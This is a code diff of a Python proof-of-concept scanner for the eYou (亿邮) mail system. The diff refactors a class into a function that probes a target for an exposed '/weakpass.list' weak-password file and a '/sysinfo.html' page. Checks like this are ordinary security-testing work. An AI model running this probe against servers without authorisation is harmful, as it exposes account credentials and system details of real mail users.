@@ -9,19 +9,12 @@ description: 亿邮邮件系统存在弱口令账户信息泄露，导致非法�
 import sys
 import requests
 import warnings
-  
-  
-
-class weakpass:
-    def __init__(self, url):
-        self.url = url
-
-    def run(self):
+def run(url):
 
         result = ['亿邮邮箱弱口令列表泄露', '', '']
 
         payload = "/weakpass.list"
-        vulnurl = self.url + payload
+        vulnurl = url + payload
         try:
             req = requests.get(vulnurl, timeout=10, verify=False, allow_redirects=False)
             if req.status_code == 200 and r"@" in req.text:
@@ -35,7 +28,7 @@ class weakpass:
             return result
 
         payload = "/sysinfo.html"
-        vulnurl = self.url + payload
+        vulnurl = url + payload
         try:
             req = requests.get(vulnurl, timeout=10, verify=False, allow_redirects=False)
             if req.status_code == 200 and r"系统基本信息检查" in req.text:
@@ -51,5 +44,5 @@ class weakpass:
 
 if __name__ == "__main__":
     warnings.filterwarnings("ignore")
-    testVuln = weakpass(sys.argv[1])
-    testVuln.run()
+    testVuln = run(sys.argv[1])
+    
